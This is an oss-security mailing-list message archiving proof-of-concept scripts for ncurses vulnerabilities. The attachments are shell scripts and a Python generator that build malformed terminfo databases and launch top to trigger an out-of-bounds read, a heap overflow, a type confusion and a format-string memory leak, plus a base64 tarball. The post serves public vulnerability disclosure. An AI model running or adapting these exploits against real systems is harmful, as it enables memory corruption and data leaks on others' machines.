Received: (qmail 19711 invoked by uid 550); 19 Apr 2023 17:25:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19530 invoked from network); 19 Apr 2023 17:25:31 -0000
Date: Wed, 19 Apr 2023 19:23:59 +0200
From: Solar Designer <solar@openwall.com>
To: "Jonathan Bar Or (JBO)" <jobaror@microsoft.com>
Cc: Carlos L?pez <clopez@suse.de>, oss-security@lists.openwall.com
Message-ID: <20230419172359.GA11033@openwall.com>
References: <SN6PR00MB044717AE269F0AABB8456C86A89BA@SN6PR00MB0447.namprd00.prod.outlook.com> <eff48e8f-cb22-bda0-772b-d9c9c5f16fbc@suse.de> <MW2PR00MB0444E2AA4D31DB0021B8AE2FA862A@MW2PR00MB0444.namprd00.prod.outlook.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="zYM0uCDKw75PZbzx"
Content-Disposition: inline
In-Reply-To: <MW2PR00MB0444E2AA4D31DB0021B8AE2FA862A@MW2PR00MB0444.namprd00.prod.outlook.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] ncurses fixes upstream

--zYM0uCDKw75PZbzx
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Wed, Apr 19, 2023 at 04:55:06PM +0000, Jonathan Bar Or (JBO) wrote:
> Yes, now that the cat is out of the bag there's no point - you can find some POCs here (not every find is covered by a POC, FYI):
> https://drive.google.com/drive/u/0/folders/1XZiHbH7W7is8cwTu7DKrpwBTYuYfRZqE
> 
> Note not all of them work on Linux - some are macOS focused too.

I'm attaching the 5 scripts from there to this message for archival,
as-is (text/plain) and in tar.gz (to avoid any mangling).  There's also
Ncurses.pdf, but it's too large for the mailing list because of embedded
screenshots.  SHA-256's of these all:

c3b981fad88f17cc201bfa7f4230a348e30b449238e3d3406852691770876eda  cost_oob_read.sh
526cde9fc78cb0712c0b725ecea316913f0302194702ebccdf1a1a146f32dac9  gen_terminfo.py
f787189535fa21a8924db2afc2ef6301a931805b43ef8ea13cdefab6aacb83d0  heap_overflow.sh
2049668efcf24f34ce200d6c2b96fefc389cf4092cfd6c99f5da66a3d46b9a5f  leak.sh
66b0706b0852a5b9e9644bea98edc0b0b84f5f7fec028fe2bf03964d46002594  type_confusion.sh

47b30bdd9fbf35cc900c3869e2303d0dabea44176fdfdfced97bd4ee329529c9  ncurses-exp.tar.gz

a8ba31a02b596f7a9f61f61cc7a98ed9aac2d358f49614d4f480bcfad3fd2a78  Ncurses.pdf

Alexander

--zYM0uCDKw75PZbzx
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="cost_oob_read.sh"

#!/bin/bash
TERM_NAME=`infocmp | grep -v "#" | head -n 1`
rm -rf ./x
echo [+] Building TERMINFO database...
echo $TERM_NAME > ./curr
echo "  pairs#32," >> ./curr
echo "  cup=$<100.>," >> ./curr
echo "  hpa=$<100.>," >> ./curr
tic -o . ./curr
echo [+] Triggering type confusion...
TERMINFO=. top


--zYM0uCDKw75PZbzx
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="gen_terminfo.py"

#! /usr/bin/env python3

import os
import sys
import struct

MAX_BOOLCOUNT = 44
MAX_NUMCOUNT = 39
MAX_STRCOUNT = 414

put_short = lambda x: struct.pack("<H", x)
buf = b""

def even_boundary(size):
    if size % 2:
        return b'\x00'
    return b''

TERM_NAME = b"blabla\x00"

MAGIC_16 = 0o432
name_size = len(TERM_NAME)
bool_count = 0x200 # fill a 128B chunk
num_count = 0x20
str_count = MAX_STRCOUNT + 0x200
str_size = 5

buf += put_short(MAGIC_16)
buf += put_short(name_size)
buf += put_short(bool_count)
buf += put_short(num_count)
buf += put_short(str_count)
buf += put_short(str_size)

buf += TERM_NAME
buf += MAX_BOOLCOUNT * b'A' + (bool_count - MAX_BOOLCOUNT) * b"B"
buf += even_boundary(name_size + bool_count)
buf += b"".join(2*bytes([i]) for i in range(num_count))

buf += str_count * put_short(0xfffe)

buf += (str_size-1) * b"Z" + b'\0'

buf += even_boundary(str_size)

# Extended header
#
ext_bool_count = 0x50
ext_num_count = 0x10
ext_str_count = 18
ext_str_size = ext_bool_count + ext_num_count + ext_str_count * 2

ext_str_table = ext_bool_count * b"aaa\0"
ext_str_table += ext_num_count * b"bbb\0"
ext_str_table += ext_str_count * b"ccc\0"
ext_str_table += ext_str_count * b"ddd\0"

ext_str_limit = len(ext_str_table)

buf += put_short(ext_bool_count)
buf += put_short(ext_num_count)
buf += put_short(ext_str_count)
buf += put_short(ext_str_size)
buf += put_short(ext_str_limit)

buf += ext_bool_count * b'C'

buf += even_boundary(ext_bool_count)

buf += b"".join(2*bytes([i+0x60]) for i in range(ext_num_count))

buf += ext_str_size * put_short(0xffff)
buf += ext_str_table

sys.stdout.buffer.write(buf)



--zYM0uCDKw75PZbzx
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="heap_overflow.sh"
Content-Transfer-Encoding: quoted-printable

#!/bin/bash
TERMINFO_FILE=3D'GgEHAAACIACeAwUAYmxhYmxhAEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU=
FBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC=
QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ=
CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk=
JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC=
QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ=
CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk=
JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCAAAAAQECAgMDBAQFBQYGBwcIC=
AkJCgoLCwwMDQ0ODg8PEBARERISExMUFBUVFhYXFxgYGRkaGhsbHBwdHR4eHx/+//7//v/+//7/=
/v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/=
+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//=
7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//=
v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+=
//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7=
//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v=
/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+/=
/7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7/=
/v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/=
+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//=
7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//=
v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+=
//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7=
//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v=
/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+/=
/7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7/=
/v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/=
+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//=
7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//=
v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+=
//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7=
//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v=
/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+/=
/7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7/=
/v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/=
+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//=
7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//=
v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+=
//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7=
//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v=
/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+/=
/7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7/=
/v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7//v/+//7/WlpaWgAAUAAQABIAhAA=
QAkNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0=
NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDYGBhYWJiY2NkZGVlZmZnZ2hoaWlqamtrbGxtbW5ub=
2//////////////////////////////////////////////////////////////////////////=
///////////////////////////////////////////////////////////////////////////=
///////////////////////////////////////////////////////////////////////////=
///////////////////////////////////////////////////////////////////////////=
/////////////////////////////////////////////////////9hYWEAYWFhAGFhYQBhYWEA=
YWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQB=
hYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAG=
FhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAY=
WFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBh=
YWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGF=
hYQBhYWEAYWFhAGFhYQBhYWEAYWFhAGJiYgBiYmIAYmJiAGJiYgBiYmIAYmJiAGJiYgBiYmIAYm=
JiAGJiYgBiYmIAYmJiAGJiYgBiYmIAYmJiAGJiYgBjY2MAY2NjAGNjYwBjY2MAY2NjAGNjYwBjY=
2MAY2NjAGNjYwBjY2MAY2NjAGNjYwBjY2MAY2NjAGNjYwBjY2MAY2NjAGNjYwBkZGQAZGRkAGRk=
ZABkZGQAZGRkAGRkZABkZGQAZGRkAGRkZABkZGQAZGRkAGRkZABkZGQAZGRkAGRkZABkZGQAZGR=
kAGRkZAA=3D'
TERM_NAME=3D`infocmp | grep -v '#' | head -n 1 | grep -o '.*|' | tr -d '|'`
rm -rf ./x
mkdir ./x
echo [+] Building TERMINFO database...
echo $TERMINFO_FILE | base64 -d > ./x/$TERM_NAME
echo [+] Triggering heap overflow...
TERMINFO=3D. top


--zYM0uCDKw75PZbzx
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="leak.sh"

#!/bin/bash
TERM_NAME=`infocmp | grep -v "#" | head -n 1`
rm -rf ./x
echo [+] Building TERMINFO database...
echo $TERM_NAME > ./curr
echo "  pairs#32," >> ./curr
echo "  cup=LEAK|%p30x%.8x|%p40x%.8x|%p50x%.8x|%p60x%.8x|%p70x%.8x|%p80x%.8x|%p90x%.8x|," >> ./curr
tic -o . ./curr
echo [+] Triggering type confusion...
echo [!] After killing top with CTRL+C you will see "LEAK" lines.
read -n 1 -s -r -p "[!] Press any key to continue..."
TERMINFO=. top

--zYM0uCDKw75PZbzx
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="type_confusion.sh"

#!/bin/bash
TERM_NAME=`infocmp | grep -v "#" | head -n 1`
rm -rf ./x
echo [+] Building TERMINFO database...
echo $TERM_NAME > ./curr
echo "  pairs#32," >> ./curr
echo "  cup=%p1%s," >> ./curr
tic -o . ./curr
echo [+] Triggering type confusion...
TERMINFO=. top


--zYM0uCDKw75PZbzx
Content-Type: application/x-gzip
Content-Disposition: attachment; filename="ncurses-exp.tar.gz"
Content-Transfer-Encoding: base64

H4sIAGAiQGQCA+1ZbXPaOBDOZ/+KrWkGCMXYBtK0UzojKCH0Amlo0hTaDvWL
jB3A9vklmJv8+JMgGAwk7XRIrp3TM9GspF2vdqVds1ZsLfR87Odx5Bb2Hgki
wUtRnFFxk876Uqkki6IsliR5T5RIt7gH5b0nQOgHigew5zlO8JDcj/h/KOyV
8x9gux9gb2zZhiO4052e/+H951+UiqW18y+LZApEdv6PjtQzKIS+V1Atu4Dt
G3CngenYRY6zxq7jBeD4i54/XXYDL9QCjmuhz/3q2dlp7eyyfQEVKJVmU+3L
1mKm+Go28/GiE8tIJY5zw6Dvm1RVBUbKWNUViF7fqRVcRRtm+Dcn/AuIspwa
GkRI5XmO07EB+IYEqeqEtq5404xv/YOzrzkgsAygI9gHeT5B4eEg9GxQ018j
UUxziak0x13UO61+G7XqsxXUkUL+qCRPXWs0a33pkHBEp1SUOVsZ4/5sBWIy
tjPxs8RExxn1NWITdUeMSBxDCgxrNAIFJPmoCpoZ2kPODscJKY74G08kdik3
1zITuFuyzM12IleBeO8yCxuzm6zY2i28pbnbHlwYuYUX23sPb77eghdv0GIi
GS0H5AhQmri6Yg/kk0JZKsVX+YWG5OEvTyQHW3wiISNcO5adkQ/UaYD9zBfr
WxYMxwMLLBs8xR7gFXeXhi+P5WDFQTEyDGPFvdjjvDQ3s8dTO9JfSZxtt3dl
i1JQjwJs61gHEys69rgUh6OgvxZJZXE2mwwcaT65GjzSUTx1Fy5rynKQ1DMf
rzoqc7GKgKTBFh3UR0VRvpLsSErmKmvaqaSqqvdKrq6r8pqm/aSkrutUMhYd
WWMruEvHxOPZLcmS9Ca7XeCh6E/Y8wD/nqxLGL00cHOT07X7AmjdhQciPSdG
h+JmuCd9TFoRR89G1BvZdbnZLnMc+UkQ/EB3wkAgAgb2hIlnBThDBkQ3t8fw
R9V/I6wMBd98lPr/gfqPfBsU1+q/olwus/rvaeq/WemnKr65LIcq3+kngDZ2
4RYGHnYhfwN8iicj+msFeRuk75w3hrxngFCIOKyZDnzJfYNqaI10yx7Mfvyb
7eMz0BXyrlB8LAjCXOz5suh6Sx4m4efNGTyAq1ienyrKL3h4u8HUQrdyWkd/
3e67RTHaF44i0ivFvXLcO4x7L+PeUdx7dddLrBFYGuQdEBJrUocuPGswwB51
KZi6GDTHNkLfcuzYny/PvgEyyGcTDEnFNxN0XJhYgQm1i85prgZTJyRjUg36
GANPXeCBCGJf4LzFdkLeJ7sJeRd4qvCDh30fFHsKQzwlCum6gWWHdBt5brG5
FYGuxe0s/6mH/aWHO3sT/Cj/S+Lh+vdfSWT5z/J/I//3XWnf30HmrmXQ/7hS
Wc1/zfGDvuOoffpa2mEh8MP8L6/f/5Wlkszyn+X/ev4/fyOJovB2K990la18
9ob42fwnh+v2nRvsGSNn8mT5L0myXF7Pf1lk+f+f5D+N+f5x87ReSTcG9ROE
UK2JahhNLlF3HJm0ofpx9fzyF9vwfY011p6qIYrzeg0NWu+q6JwEYLdRnWjN
GiLMgXNam0xa787Fs3eDow/1KurUO82P9ahFIvXy07HZ/XwcDbqNzlBpmL56
Up3oJ50SPokKuULhZaFwwyijjDLKKKOMMsro70SvRq5yNUDoklSAqNpEJqXD
Nin3nqaRStPsXr23unJ72Gt8GvXGPbsnm45yNfpbGQee2ogC9aocqnKB4VHx
ipxDHXWvjk3UIFX9eZWNf9sxyZdB1eqOm6g7fm/taHzdlVuI5OE1arSvu5Od
j0l+n6Me+VBEpPXQrseokn74cjadSq9ezsYcB9LCwS3lBR7kdUjfphMXt+Oh
bnm/doUbXxQR5ZR7WKIL0FvXqLC8491620rvGSG+Z2T/jmFgYGBgYGBgYGBg
YGBgYGBgYGBgYGBgYGBgYGBgYGBgYGD4VfwLw1avEABQAAA=

--zYM0uCDKw75PZbzx--
